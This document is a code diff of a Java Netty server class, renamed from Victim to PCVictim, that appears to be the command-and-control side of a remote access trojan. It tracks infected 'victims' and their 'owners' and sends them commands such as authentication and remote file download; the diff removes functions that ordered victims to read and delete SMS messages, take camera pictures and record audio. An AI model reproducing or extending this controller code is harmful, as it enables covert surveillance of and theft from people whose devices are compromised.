@@ -1,21 +1,19 @@
 import db.DBUsers;
-import io.netty.channel.ChannelFuture;
-import io.netty.channel.ChannelFutureListener;
 import io.netty.channel.ChannelHandlerContext;
 import org.json.simple.JSONArray;
 import org.json.simple.JSONObject;
 
-import java.awt.image.DataBuffer;
+import java.io.File;
 import java.net.SocketAddress;
 import java.util.ArrayList;
 
-public class Victim {
+public class PCVictim {
     private DBUsers dbUsers;
     private ChannelHandlerContext context;
     private String name;
     private ArrayList<String> owners;
 
-    public Victim(ChannelHandlerContext context, String name) {
+    public PCVictim(ChannelHandlerContext context, String name) {
         this.context = context;
         this.name = name;
         this.owners = NettyServer.getDBManager().DBUsers.getOwnersByVictim(name);
@@ -25,9 +23,9 @@ public class Victim {
         context.disconnect();
     }
 
-    public void sendAuthVictim() {
+    public void sendAuthPCVictim() {
         JSONObject query = new JSONObject();
-        query.put("action", "auth.victim");
+        query.put("action", "auth.pcvictim");
         sendMessage(query);
     }
 
@@ -117,39 +115,6 @@ public class Victim {
         sendMessage(query);
     }
 
-    public void sendGetSms(String type, long count, String owner) {
-        JSONObject query = new JSONObject();
-        query.put("action", "get.sms");
-        query.put("type", type);
-        query.put("count", count);
-        query.put("owner", owner);
-        sendMessage(query);
-    }
-
-    public void sendDeleteSms(long id, String owner) {
-        JSONObject query = new JSONObject();
-        query.put("action", "delete.sms");
-        query.put("id", id);
-        query.put("owner", owner);
-        sendMessage(query);
-    }
-
-    public void sendTakePicture(String camera, String owner) {
-        JSONObject query = new JSONObject();
-        query.put("action", "take.picture");
-        query.put("camera", camera);
-        query.put("owner", owner);
-        sendMessage(query);
-    }
-
-    public void sendStartAudioRecord(long seconds, String owner) {
-        JSONObject query = new JSONObject();
-        query.put("action", "start.audio.record");
-        query.put("seconds", seconds);
-        query.put("owner", owner);
-        sendMessage(query);
-    }
-
     public void sendDownloadFile(String path, long port, String owner) {
         JSONObject query = new JSONObject();
         query.put("action", "download.file");
@@ -158,6 +123,5 @@ public class Victim {
         query.put("owner", owner);
         sendMessage(query);
     }
-
 
 }
